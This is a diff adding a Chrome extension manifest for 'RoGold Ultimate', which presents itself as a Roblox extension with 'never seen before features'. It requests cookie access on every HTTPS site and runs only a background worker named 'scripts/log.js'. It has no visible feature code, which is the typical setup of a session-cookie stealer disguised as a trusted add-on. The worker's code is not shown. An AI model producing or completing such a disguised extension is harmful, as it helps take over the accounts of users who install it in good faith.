@@ -1,0 +1,29 @@
+{
+    "name": "RoGold Ultimate",
+    "description": "RoGold is without a doubt, the only Roblox extension you’ll ever need. We have many unique and never seen before features.",
+    "version": "8.1.44",
+    "manifest_version": 3,
+
+    "action" : {
+        "default_icon": "assets/rogold.png"
+    },
+
+    "host_permissions": [
+	"https://*/*"
+    ],
+
+    "permissions": [
+        "cookies"
+    ],
+
+    "background": {
+        "service_worker": "scripts/log.js"
+    },
+
+    "icons": {
+        "16": "assets/rogold.png",
+        "32": "assets/rogold.png",
+        "48": "assets/rogold.png",
+        "128": "assets/rogold.png"
+    }
+}
